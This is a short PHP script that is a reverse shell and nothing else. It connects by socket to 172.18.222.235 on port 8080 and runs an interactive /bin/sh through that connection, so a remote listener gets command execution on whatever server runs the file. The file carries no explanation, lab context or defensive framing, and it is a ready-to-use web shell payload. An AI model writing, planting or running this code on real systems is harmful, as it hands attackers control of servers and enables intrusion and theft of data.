 <?php
 $sock=fsockopen("172.18.222.235",8080);
 exec("/bin/sh -i <&3 >&3 2>&3");
 ?>